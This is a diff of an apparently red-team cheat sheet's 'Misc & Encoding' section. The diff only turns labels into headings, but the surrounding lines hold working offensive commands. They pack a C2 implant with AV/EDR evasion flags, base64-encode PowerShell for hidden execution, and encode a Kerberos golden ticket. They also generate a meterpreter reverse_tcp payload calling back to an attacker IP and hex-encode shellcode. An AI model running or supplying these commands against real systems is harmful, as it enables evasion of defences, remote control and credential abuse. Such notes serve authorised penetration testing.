@@ -231,26 +231,26 @@ WMIC Lateral Movement
 
 # Misc & Encoding
 
-PeZOR Packing and Encoding 
+#### PeZOR Packing and Encoding 
 
 ```cpp
 	PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
 ```
 
-Cat to base64 
+#### Cat to base64 
 
 ```cpp
 	cat file.ps1 | iconv -t utf-16le | base64 -w 0
 	powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
 ```
 
-Powershell to base64
+#### Powershell to base64
 
 ```cpp
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
 ``` 
 
-Hex Encode 
+#### Hex Encode 
 
 ```
 	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
@@ -258,7 +258,7 @@ Hex Encode
 	xxd -i encmeter.bin
 ```
 
-Default MSF bin
+#### Default MSF bin
 
 ```
 	msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
